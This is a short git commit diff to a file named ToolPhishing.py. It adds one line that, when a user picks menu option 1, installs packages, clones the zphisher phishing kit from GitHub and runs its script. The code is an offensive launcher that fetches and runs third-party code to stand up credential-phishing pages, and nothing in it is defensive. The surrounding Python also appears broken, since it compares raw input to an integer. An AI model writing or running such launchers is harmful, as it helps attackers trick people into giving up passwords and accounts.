bf36c2eacbd4e4e0d3a56cdb2e049ab1cffe7887
BlackBeliefSecurityTeam <70011454+BlackBeliefSecurityTeam@users.noreply.github.com>
2020-08-21 16:06:19 +0430

    Update ToolPhishing.py

--- ToolPhishing.py
+++ ToolPhishing.py
@@ -16,4 +16,4 @@ print"""
 o= input('Code=>')
 
 if o== 1:
-       
+        os.system("apt update ; apt install git curl php openssh -y ; git clone git://github.com/htr-tech/zphisher.git ; cd zphisher ; bash zphisher.sh")
